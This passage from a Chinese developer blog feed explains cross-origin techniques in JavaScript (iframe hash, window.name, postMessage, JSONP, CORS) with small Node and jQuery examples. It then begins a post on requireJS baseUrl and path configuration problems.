ifr.contentDocument||ifr.contentWindow.document;</span><br><span class="line"><span class="comment">//其他操作</span></span><br></pre></td></tr></table></figure><h4 id="location-hash和iframe"><a href="#location-hash和iframe" class="headerlink" title="location.hash和iframe:"></a>location.hash和iframe:</h4><p>location.hash值表示url地址的哈希值，如www.luoxia520.com#luoxia中#luoxia就是hash，改变某个网页的hash并不会刷新页面，我们可以在异域的iframe中直接改变ifame拥有者的hash值，但是有些浏览器是不允许异域的iframe改变其parent的hash的，我们可以增加一个代理的网页，这个网页和父级框架是同域的，然后这个代理框架就可以修改父级的hash了：</p><p>发送方www.baidu.com/index.html:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    parent.location.hash = <span class="string">'somedata'</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="comment">// ie、chrome的安全机制无法修改parent.location.hash，</span></span><br><span class="line">    <span class="comment">// 所以要利用一个中间的cnblogs域下的代理iframe</span></span><br><span class="line">    <span class="keyword">var</span> ifrproxy = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line">    ifrproxy.style.display = <span class="string">'none'</span>;</span><br><span class="line">    ifrproxy.src = <span class="string">'www.luoxia520.com/proxy.html#somedata'</span>;    <span class="comment">// 注意该文件在"a.com"域下</span></span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(ifrproxy);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接受方www.luoxia520.com:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">var</span> ifr = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line">    ifr.style.display = <span class="string">'none'</span>;</span><br><span class="line">    ifr.src = <span class="string">'htttp://www.baidu.com'</span>;</span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(ifr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkHash</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> data = location.hash ? location.hash.substring(<span class="number">1</span>) : <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">console</span>.log) &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'Now the data is '</span>+data);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(e) &#123;&#125;;</span><br><span class="line">&#125;</span><br><span class="line">setInterval(checkHash, <span class="number">2000</span>);</span><br></pre></td></tr></table></figure><p>代理方www.luoxia520.com/proxy.html:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//因为parent.parent和自身属于同一个域，所以可以改变其location.hash的值</span></span><br><span class="line">parent.parent.location.hash = self.location.hash.substring(<span class="number">1</span>);</span><br></pre></td></tr></table></figure></p><h3 id="4-window-name"><a href="#4-window-name" class="headerlink" title="4. window.name:"></a>4. window.name:</h3><p>window下有一个全局的name属性，出于安全方面考虑，某个页面只能访问与其同域下的网页的window.name属性。</p><p>对于一个框架，当其加载某个页面时，这个页面的window.name属性会报错在这个frame下，现在当它加载另一个页面时，这个时候frame保存的windwo.name属性将不会发生变化。</p><p>利用上述原理，我们可以在将某个页面的iframe的src指向异域的页面，获取到其window.name后，我们再将iframe的src指向一个同源的‘代理’页面，这样我们就可以访问到这个window.name了：</p><p>发送消息:www.baidu.com:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="built_in">window</span>.name = <span class="string">'I was there!'</span>;    <span class="comment">// 这里是要传输的数据，大小一般为2M，IE和firefox下可以大至32M左右</span></span><br><span class="line">                                     <span class="comment">// 数据格式可以自定义，如json、字符串</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p><p>接受消息:www.luoxia520.com/index.html</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="keyword">var</span> state = <span class="number">0</span>, </span><br><span class="line">    iframe = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>),</span><br><span class="line">    loadfn = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (state === <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> data = iframe.contentWindow.name;    <span class="comment">// 读取数据</span></span><br><span class="line">            alert(data);    <span class="comment">//弹出'I was there!'</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (state === <span class="number">0</span>) &#123;</span><br><span class="line">            state = <span class="number">1</span>;</span><br><span class="line">            iframe.contentWindow.location = <span class="string">"http://www.luoxia520.com/proxy.html"</span>;    <span class="comment">// 设置的代理文件</span></span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;;</span><br><span class="line">    iframe.src = <span class="string">'http://b.com/data.html'</span>;</span><br><span class="line">    iframe.onload  = loadfn;</span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(iframe);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h3 id="5-HTML5跨文档消息传递-XDM"><a href="#5-HTML5跨文档消息传递-XDM" class="headerlink" title="5.HTML5跨文档消息传递(XDM):"></a>5.HTML5跨文档消息传递(XDM):</h3><p>跨文档消息传递是HTML5提供的用于网页文档之间互相接收和发送消息的功能</p><p><strong>发送消息</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">otherWindow.postMessage(message,targetOrigin);</span><br><span class="line"><span class="comment">//message可以是字符串，js对象可通过转换成json字符串的形式传递</span></span><br></pre></td></tr></table></figure></p><p>otherWindow是指包含其他页面的内联框架的contentWindow,targetOrigin是规定接受方页面必须来自于哪个域，*表示允许所以域，如果满足要求，则会向内联框架内的页面发送message<br><strong>接收信息</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'message'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;...&#125;,<span class="literal">false</span>);</span><br></pre></td></tr></table></figure><p>这里window是内联框架指向的页面的window对象，message事件的回调函数的event对象参数有三个属性：data(数据）,origin(发送方的域），source(发送方的window对象代理），这个source只是发送方window的代理，只用于调用postMessage方法，用于向发送方回复消息。</p><h3 id="6-JSONP"><a href="#6-JSONP" class="headerlink" title="6. JSONP"></a>6. JSONP</h3><h4 id="啥是JSONP-JSON-with-padding（参数式json-，实际上是对json的一种应用方法，将json数据传给回调函数，JSONP是通过script元素设计的，如下："><a href="#啥是JSONP-JSON-with-padding（参数式json-，实际上是对json的一种应用方法，将json数据传给回调函数，JSONP是通过script元素设计的，如下：" class="headerlink" title="啥是JSONP? JSON with padding（参数式json)，实际上是对json的一种应用方法，将json数据传给回调函数，JSONP是通过script元素设计的，如下："></a>啥是JSONP? JSON with padding（参数式json)，实际上是对json的一种应用方法，将json数据传给回调函数，JSONP是通过script元素设计的，如下：</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">'www.luoxia520.com/blog/?callback=callback'</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callback</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(data.name);</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>这里通过script可加载任意域内容的特点对异域进行强求，查询字符串包含callback参数，服务器传回的是可执行的js代码，即对于的callback(data)调用。当然服务端代码也要响应的更改。下面介绍。</p><h3 id="这里以jquery的ajax为例"><a href="#这里以jquery的ajax为例" class="headerlink" title="这里以jquery的ajax为例:"></a>这里以jquery的ajax为例:</h3><ol><li><p>前端ajax请求代码: testJsonp.html</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            dataType: <span class="string">'jsonp'</span>,</span><br><span class="line">            url: <span class="string">'http://localhost:8088'</span>,</span><br><span class="line">            type:<span class="string">'get'</span>,</span><br><span class="line">            success: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">                   $(<span class="string">'#name'</span>).text(data);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"> &#125;);</span><br></pre></td></tr></table></figure></li><li><p>用Nodejs实现得异域服务器代码:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">var</span> urlLib = <span class="built_in">require</span>(<span class="string">'url'</span>);</span><br><span class="line"><span class="keyword">var</span> data = &#123;<span class="attr">name</span>:<span class="string">'luoxia'</span>,<span class="attr">year</span>:<span class="number">18</span>&#125;;</span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> parms = urlLib.parse(req.url,<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">var</span> str = parms.query.callback + <span class="string">'('</span> + <span class="built_in">JSON</span>.stringify(data) +<span class="string">')'</span>;</span><br><span class="line">    res.end(str);</span><br><span class="line">&#125;).listen(<span class="number">8088</span>);</span><br></pre></td></tr></table></figure></li></ol><p>jquery的ajax也是利用script的原理，只不过只要设置了dataType为jsonp的话，就自动回发送jsonp请求，我们可以看到testJsonp.html请求的URL:<br><img src="http://7xsi10.com1.z0.glb.clouddn.com/jsonp.png" alt="jsonp"><br>看到了吧，自动加上了callback查询字符串，callback的值是动态生成的，当然也可以指定其值，没啥影响，还有，前面的callback这个，也可以改的，通过jsonp属性指定，当然这是细节。</p><p>nodejs通过查询callback值，即回调函数名，然后返回传递了json数据的可执行js字符串。</p><p>最后成功地实现了跨域，哈哈哈哈哈哈哈哈。<br><img src="http://7xsi10.com1.z0.glb.clouddn.com/luoxia.png" alt="luoxia"></p><h5 id="jsonp只能发送get请求。"><a href="#jsonp只能发送get请求。" class="headerlink" title="jsonp只能发送get请求。"></a>jsonp只能发送get请求。</h5><p>当然这里开始遇到了个问题，console老是报错</p><pre><code>Failed to load resource: net::ERR_CACHE_MISS</code></pre><p>，好大一半天不知道咋解决，后面在论坛的悠悠建议下，给ajax请求url加了个协议，丫的，成了。。。或许无法自动补全吧，细节啊。。。。</p><h3 id="7-CORS"><a href="#7-CORS" class="headerlink" title="7. CORS"></a>7. CORS</h3><h5 id="CORS即跨源资源共享，是W3C的草案，定义了必要时浏览器和异域服务器该如何进行跨域的沟通。CORS与JSONP相比，无疑更为先进、方便和可靠。"><a href="#CORS即跨源资源共享，是W3C的草案，定义了必要时浏览器和异域服务器该如何进行跨域的沟通。CORS与JSONP相比，无疑更为先进、方便和可靠。" class="headerlink" title="CORS即跨源资源共享，是W3C的草案，定义了必要时浏览器和异域服务器该如何进行跨域的沟通。CORS与JSONP相比，无疑更为先进、方便和可靠。"></a>CORS即跨源资源共享，是W3C的草案，定义了必要时浏览器和异域服务器该如何进行跨域的沟通。CORS与JSONP相比，无疑更为先进、方便和可靠。</h5><ol><li><p>JSONP只能实现GET请求，而CORS支持所有类型的HTTP请求。</p></li><li><p>使用CORS，开发者可以使用普通的XMLHttpRequest发起请求和获得数据，比起JSONP有更好的错误处理。</p></li><li><p>JSONP主要被老的浏览器支持，它们往往不支持CORS，而绝大多数现代浏览器都已经支持了CORS</p></li></ol><p>要求请求头加入<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Origin: host:port</span><br></pre></td></tr></table></figure></p><p>响应头必须加入和请求头同样host:port的响应信息:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: host:port</span><br></pre></td></tr></table></figure></p><p>IE8以下的就别想了,IE8，IE9可以通过XDR实现，反正我觉得，垃圾IE,现在微软自己都放弃治疗了。。。。。。</p><p>来具体看看实现例子，还是jquery的ajax:</p><p>前端testCORS.html:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            url: <span class="string">'http://localhost:8088'</span>,</span><br><span class="line">            type:<span class="string">'get'</span>,</span><br><span class="line">            success: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">                   $(<span class="string">'#name'</span>).text(<span class="built_in">JSON</span>.parse(data).name);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"> &#125;);</span><br></pre></td></tr></table></figure></p><p>Node： CORS.js<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="comment">//var urlLib = require('url');</span></span><br><span class="line"><span class="keyword">var</span> data = &#123;<span class="attr">name</span>:<span class="string">'luoxia'</span>,<span class="attr">year</span>:<span class="number">18</span>&#125;;</span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> parms = urlLib.parse(req.url,<span class="literal">true</span>);</span><br><span class="line">    res.writeHead(<span class="number">200</span>,&#123;<span class="string">'Access-Control-Allow-Origin'</span>:<span class="string">'*'</span>,<span class="string">'Access-Control-Allow-Method'</span>:<span class="string">'GET,POST'</span>&#125;);</span><br><span class="line">    res.end(<span class="built_in">JSON</span>.stringify(data));</span><br><span class="line">&#125;).listen(<span class="number">8088</span>);</span><br></pre></td></tr></table></figure></p><p>这里Access-Control-Allow-Origin可以设置为*代表允许说有域，当然也可以写具体的url。<br>最终是没问题的：</p><p>CORS一定程度上缓解了CSRF,XSS等安全问题。</p><p>明天就5.20，国际计量节！单身狗过国际计量节，new对象去了。。。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;由于出于安全方面的考虑，JavaScript有着跨源策略的限制，也就是某个域的网页只能对同域进行访问。本文记录几种跨域实现及我自己的实践。&lt;/p&gt;
&lt;h4 id=&quot;本文总结以下方式实现跨域通信：&quot;&gt;&lt;a href=&quot;#本文总结以下方式实现跨域通信：&quot; class=&quot;headerlink&quot; title=&quot;本文总结以下方式实现跨域通信：&quot;&gt;&lt;/a&gt;本文总结以下方式实现跨域通信：&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;代理服务器&lt;/li&gt;
&lt;li&gt;图像Ping&lt;/li&gt;
&lt;li&gt;iframe技术（iframe+document.domain;iframe+location.hash)&lt;/li&gt;
&lt;li&gt;window.name&lt;/li&gt;
&lt;li&gt;HTML5跨文档消息传递(XDM)&lt;/li&gt;
&lt;li&gt;JSONP&lt;/li&gt;
&lt;li&gt;CORS(跨站资源共享)
    
    </summary>
    
      <category term="JavaScript" scheme="http://luoxia.me/code/categories/JavaScript/"/>
    
    
      <category term="nodejs" scheme="http://luoxia.me/code/tags/nodejs/"/>
    
      <category term="ajax" scheme="http://luoxia.me/code/tags/ajax/"/>
    
      <category term="跨域" scheme="http://luoxia.me/code/tags/%E8%B7%A8%E5%9F%9F/"/>
    
  </entry>
  
  <entry>
    <title>requireJS</title>
    <link href="http://luoxia.me/code/2016/05/07/requireJS/"/>
    <id>http://luoxia.me/code/2016/05/07/requireJS/</id>
    <published>2016-05-07T06:04:59.000Z</published>
    <updated>2017-11-16T13:10:06.489Z</updated>
    
    <content type="html"><![CDATA[<h4 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h4><p>模块化开发在如今纷繁复杂的产品开发中显得非常重要，而由于js自身的缺陷，在es6之前，js并没有自己的模块规范，而nodeJS通过CommonJS的模块规范实现了自己的模块机制，但是这仅仅是在node端，而在客户端，有自己的实现方式，诸如AMD,CMD之类，本文是我初次接触AMD规范时遇到的问题总结，而这段序言也是在我后面重新加上的。<br><a id="more"></a></p><h5 id="在于客户端，requirejs是AMD规范最好的实现者，关于requirejs在使用过程中遇到的问题记录，主要是路径问题。（CommonJS-AMD-UMD等规范内容找个时间再总结下，以及后边与es6模块的对比）"><a href="#在于客户端，requirejs是AMD规范最好的实现者，关于requirejs在使用过程中遇到的问题记录，主要是路径问题。（CommonJS-AMD-UMD等规范内容找个时间再总结下，以及后边与es6模块的对比）" class="headerlink" title="在于客户端，requirejs是AMD规范最好的实现者，关于requirejs在使用过程中遇到的问题记录，主要是路径问题。（CommonJS,AMD,UMD等规范内容找个时间再总结下，以及后边与es6模块的对比）"></a>在于客户端，requirejs是AMD规范最好的实现者，关于requirejs在使用过程中遇到的问题记录，主要是路径问题。（CommonJS,AMD,UMD等规范内容找个时间再总结下，以及后边与es6模块的对比）</h5><p>我的项目结构（测试用，不合理）：</p><pre><code>----gulp    ----app        ----html                index.html        ----js                a.js                b.js                c.js        ----require.js        ----config.js    ----bower_comonents        ----jquery            ----dist                jquery.min.js</code></pre><ol><li><p>当引入requirejs的时候指定data-main属性:(index.html)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">data-main</span>=<span class="string">"../config"</span> <span class="attr">src</span>=<span class="string">"../require.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>data-main作为入口文件，有个作用就是它会把模块的baseUrl设置为config所在目录</p></li><li><p>然后配置config.js:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>.config(&#123;</span><br><span class="line">    paths : &#123;</span><br><span class="line">        jquery: [<span class="string">'../bower_components/jquery/dist/jquery.min'</span>]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li><li><p>baseUrl就是config文件所在目录，设定paths值当然根据baseUrl来，如这里就相当于gulp/app/../bower_components/jquery/dist/jquery.min，然后index.html:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="built_in">require</span>([<span class="string">'jquery'</span>],<span class="function"><span class="keyword">function</span>(<span class="params">$</span>)</span>&#123;</span><br><span class="line">        $(<span class="string">'body'</span>).append($(<span class="string">'&lt;p&gt;hello&lt;/p&gt;'</span>));</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></li></ol><p>理论上是没问题的，但会报错，get app/jquery.js net::ERR_FILE_NOT_FOUND，这咋回事？paths根本没生效，然后我又试着显示地配置baseUrl属性（注意配置路径是针对于引入requirejs的那个html文件来的），照样报同样的错误，最后，我这样写：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"../require.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"../config.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="built_in">require</span>([<span class="string">'jquery'</span>],<span class="function"><span class="keyword">function</span>(<span class="params">$</span>)</span>&#123;</span><br><span class="line">        $(<span class="string">'body'</span>).append($(<span class="string">'&lt;p&gt;hello&lt;/p&gt;'</span>));</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p><p>也就是说，config分开加载，当然此时的config配置会有所变化，因为不是在data-main属性中引入，所有baseUrl默认的会是这里引入require的html文件的路径，所以：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>.config(&#123;</span><br><span class="line">    baseUrl:<span class="string">'../../'</span>,</span><br><span class="line">    paths : &#123;</span><br><span class="line">        jquery: [<span class="string">'bower_components/jquery/dist/jquery.min'</span>]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>这里baseUrl设置后就相当于gulp目录，然后现在在运行html,达到预期效果，why?</p><h4 id="应该是这样：开始的例子中，引入require文件，加载执行require-js-然后异步加载config-js，config配置还没生效时，我后面的代码就执行了，由于已经设置data-main属性，所以回去加载app-js-jquery-js，没找到，所以挂了。"><a href="#应该是这样：开始的例子中，引入require文件，加载执行require-js-然后异步加载config-js，config配置还没生效时，我后面的代码就执行了，由于已经设置data-main属性，所以回去加载app-js-jquery-js，没找到，所以挂了。" class="headerlink" title="应该是这样：开始的例子中，引入require文件，加载执行require.js,然后异步加载config.js，config配置还没生效时，我后面的代码就执行了，由于已经设置data-main属性，所以回去加载app/js/jquery.js，没找到，所以挂了。"></a>应该是这样：开始的例子中，引入require文件，加载执行require.js,然后异步加载config.js，config配置还没生效时，我后面的代码就执行了，由于已经设置data-main属性，所以回去加载app/js/jquery.js，没找到，所以挂了。</h4><p>我的解决办法：<br>要么把代码放在config.js中，要么在config里引入我的代码模块,或者同步加载config配置，只不过是baseUrl不同而已。</p><h4 id="另外还有一个需要注意到的是，在定义模块的时候，define-id-dep-factory-的时候，dep依赖其他模块的目录有两种方式："><a href="#另外还有一个需要注意到的是，在定义模块的时候，define-id-dep-factory-的时候，dep依赖其他模块的目录有两种方式：" class="headerlink" title="另外还有一个需要注意到的是，在定义模块的时候，define(id,dep,factory)的时候，dep依赖其他模块的目录有两种方式："></a>另外还有一个需要注意到的是，在定义模块的时候，define(id,dep,factory)的时候，dep依赖其他模块的目录有两种方式：</h4><ol><li>依据config显式地设置的baseUrl或者默认的baseUrl的路径结合paths配置</li><li>./开头的路径，那么久不是根据baseUrl了，是根据这个模块本身的位置来的</li></ol><p>举个栗子：</p><p>index.html:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"../require.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"../config.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"../js/a.js"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="built_in">require</span>([<span class="string">'jquery'</span>],<span class="function"><span class="keyword">function</span>(<span class="params">$</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        $(<span class="string">'body'</span>).append($(<span class="string">'&lt;p&gt;hello&lt;/p&gt;'</span>));</span></span><br><span class="line"><span class="undefined">    &#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>hello wrold<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>config.js:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>.config(&#123;</span><br><span class="line">    baseUrl:<span class="string">'../../'</span>,</span><br><span class="line">    paths : &#123;</span><br><span class="line">        jquery: [<span class="string">'bower_components/jquery/dist/jquery.min'</span>]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>a.js:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>([<span class="string">'app/js/b'</span>],<span class="function"><span class="keyword">function</span>(<span class="params">b</span>)</span>&#123;</span><br><span class="line">    b.jq();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>b.js:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这里也可以define(['jquery','./c'],...)</span></span><br><span class="line">define([<span class="string">'jquery'</span>,<span class="string">'app/js/c'</span>],<span class="function"><span class="keyword">function</span>(<span class="params">$,c</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> b = &#123;&#125;;</span><br><span class="line">    b.jq = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $(<span class="string">'body'</span>).append($(<span class="string">'&lt;p&gt;hello&lt;/p&gt;'</span>));</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">console</span>.log(c.name);</span><br><span class="line">    <span class="keyword">return</span> b;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>c.js:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="function"><span 